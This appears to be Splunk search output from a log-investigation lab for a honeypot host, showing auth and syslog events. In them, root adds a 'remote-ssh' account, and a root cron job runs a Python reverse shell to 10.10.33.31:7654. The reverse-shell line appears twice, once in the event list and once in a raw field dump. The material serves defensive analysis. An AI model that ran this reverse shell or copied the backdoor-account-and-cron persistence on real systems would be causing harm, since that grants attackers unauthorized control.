	# Time	Event

12/08/2025
09:52:57.200	
2025-08-12T09:52:57.200559+00:00 deceptipot-demo useradd[2709]: new user: name=remote-ssh, UID=1004, GID=1004, home=/home/remote-ssh, shell=/bin/sh, from=/dev/pts/2
host = ce-splunksource = auth.logsourcetype = linux_secure

12/08/2025
09:52:57.200	
2025-08-12T09:52:57.200420+00:00 deceptipot-demo useradd[2709]: new group: name=remote-ssh, GID=1004
host = ce-splunksource = auth.logsourcetype = linux_secure

12/08/2025
09:52:57.170	
2025-08-12T09:52:57.170059+00:00 deceptipot-demo sudo:     root : TTY=pts/1 ; PWD=/home/jack-brown ; USER=root ; COMMAND=/usr/sbin/useradd remote-ssh
host = ce-splunksource = auth.logsourcetype = linux_secure


**index=task5 process=sshd 
| search "Accepted password" OR "Failed password"**


	Time	Event

12/08/2025
10:00:01.270	
2025-08-12T10:00:01.270628+00:00 deceptipot-demo CRON[3042]: (root) CMD (/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.33.31",7654));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> /tmp/cron_output.log 2>&1)
host = deceptipot-demosource = syslogsourcetype = syslog

12/08/2025
09:55:01.259	
2025-08-12T09:55:01.259537+00:00 deceptipot-demo CRON[2971]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)
host = deceptipot-demosource = syslogsourcetype = syslog
**index=task5 source="syslog" 
|  search cron Cron**


raw	_time
 	 	10	12	0	august	1	tuesday	2025	0	deceptipot-demo	deceptipot-demo	
nix-all-logs
nix_ta_data
deceptipot-demo	task5	1	 	 	subprocess.call(["/bin/sh","-i"])	3042	CRON	--::.+:_-_[]:_()__(///_-_'_,,;=.(.,.);.(("...",));	socket.socket(socket.AF_INET,socket.SOCK_STREAM)	 	syslog	syslog	ce-splunk	 	 	 	 	 	 	32	0	nix	2025-08-12T10:00:01.270628+00:00 deceptipot-demo CRON[3042]: (root) CMD (/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.33.31",7654));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> /tmp/cron_output.log 2>&1)


 	1004	 	 	1004	 	created	 	 	AAA	useradd	9	12	52	august	57	tuesday	2025	0	 	 	 	 	
nix-all-logs
nix_security
nix_ta_data
useradd
/dev/pts/2	/home/remote-ssh	ce-splunk	task5	1	remote-ssh	remote-ssh	1004	user	1004	/home/remote-ssh	2709	useradd	--::.+:_-_[]:__:_=-,_=,_=,_=//-,_=//,_=///	 	 	 	/bin/sh	 	auth.log	linux_secure	ce-splunk	 	 	 	 	 	 	 	 	 	 	success	
account
add
change
interactive
management
os
unix
 	
account
add
change
management
os
unix
interactive	32	0	 	 	remote-ssh	 	remote-ssh	 	 	added	nix	2025-08-12T09:52:57.200559+00:00 deceptipot-demo useradd[2709]: new user: name=remote-ssh, UID=1004, GID=1004, home=/home/remote-ssh, shell=/bin/sh, from=/dev/pts/2	2025-08-12 09:52:57.200
 	1004	 	 	 	 	 	 	 	 	 	9	12	52	august	57	tuesday	2025	0	 	 	 	 	
nix-all-logs
nix_security
nix_ta_data
 	 	ce-splunk	task5	1	remote-ssh	 	 	 	 	 	2709	useradd	--::.+:_-_[]:__:_=-,_=	 	 	 	 	 	auth.log	linux_secure	ce-splunk	 	 	 	 	 	 	 	 	 	 	 	
os
unix
 	
os
unix
 	32	0	 	 	 	 	 	 	 	 	nix	2025-08-12T09:52:57.200420+00:00 deceptipot-demo useradd[2709]: new group: name=remote-ssh, GID=1004	2025-08-12 09:52:57.200
/usr/sbin/useradd	 	/home/jack-brown	pts/1	 	root	 	 	 	 	 	9	12	52	august	57	tuesday	2025	0	 	 	 	 	
nix-all-logs
nix_security
nix_ta_data
useradd
 	 	ce-splunk	task5	1	 	 	 	 	 	 	 	sudo	--::.+:_-_:______:_=/_;_=//-_;_=_;_=///_-	 	 	 	 	 	auth.log	linux_secure	ce-splunk	 	 	 	 	 	 	 	 	 	 	 	
account
add
change
management
os
unix
 	
account
add
change
management
os
unix
 	32	0	 	 	 	 	 	 	 	 	nix	2025-08-12T09:52:57.170059+00:00 deceptipot-demo sudo:     root : TTY=pts/1 ; PWD=/home/jack-brown ; USER=root ; COMMAND=/usr/sbin/useradd remote-ssh	2025-08-12 09:52:57.170
